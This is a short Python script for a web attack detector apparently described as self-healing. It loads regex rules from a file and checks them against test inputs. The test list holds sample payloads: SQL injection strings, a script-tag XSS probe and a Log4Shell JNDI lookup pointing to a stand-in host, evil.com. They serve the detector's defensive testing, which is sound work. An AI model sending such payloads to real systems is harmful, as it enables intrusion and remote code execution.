import re

# -------------------------------
# Load Generated Rules
# -------------------------------
def load_generated_rules():
    rules = []

    try:
        with open("generated_rules.txt", "r") as file:
            lines = file.readlines()

            for line in lines:
                if "|" in line:
                    attack, pattern = line.strip().split("|", 1)
                    rules.append((attack.strip(), pattern.strip()))

    except FileNotFoundError:
        print("⚠️ No generated_rules.txt found")

    return rules

# -------------------------------
# Detect using Generated Rules
# -------------------------------
def detect_with_generated_rules(input_text, rules):
    for attack, pattern in rules:
        try:
            if re.search(pattern, input_text, re.IGNORECASE):
                return attack
        except re.error:
            print(f"⚠️ Invalid regex skipped: {pattern}")
    return None

# -------------------------------
# Test Self-Healing System
# -------------------------------
def test_self_healing():
    rules = load_generated_rules()

    if not rules:
        print("No rules available.")
        return

    print("🛡️ Self-Healing Detection Running...\n")

    test_inputs = [
        "' OR 1=1 --",
        "admin' --",
        "<script>alert(1)</script>",
        "${jndi:ldap://evil.com}",
        "normal request"
    ]

    for test in test_inputs:
        result = detect_with_generated_rules(test, rules)

        print(f"Input: {test}")

        if result:
            print(f"Blocked by Generated Rule: {result}")
        else:
            print("No match (allowed)")

        print("-" * 50)

# -------------------------------
# Run
# -------------------------------
if __name__ == "__main__":
    test_self_healing()